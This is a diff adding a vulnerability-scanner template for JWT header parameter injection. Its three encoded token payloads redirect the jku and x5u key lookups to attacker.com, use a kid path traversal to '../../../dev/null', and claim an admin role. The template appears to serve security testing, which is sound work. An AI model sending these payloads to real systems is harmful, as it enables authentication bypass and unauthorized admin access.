@@ -1,0 +1,42 @@
+# templates/jwt/jwt-header-injection.yaml
+id: jwt-header-injection
+info:
+  name: JWT Header Parameter Injection
+  author: shadowxp
+  severity: critical
+  description: Tests for JWT header parameter injection vulnerabilities (jku, kid, x5u)
+  tags:
+    - jwt
+    - injection
+    - header
+    - cve-2018-0114
+
+vulnerability_type: jwt
+
+request:
+  - method: GET
+    path: "{{BaseURL}}"
+    headers:
+      Authorization: "Bearer {{jwt_payload}}"
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+          - "success"
+          - "root"
+        part: body
+
+payloads:
+  # JKU manipulation
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vLndlbGwta25vd24vandrcy5qc29uIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.signature"
+  # Kid path traversal
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.signature"
+  # X5U manipulation
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vbWFsaWNpb3VzLmNydCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.signature"
+
+encoders:
+  - jwt_decode
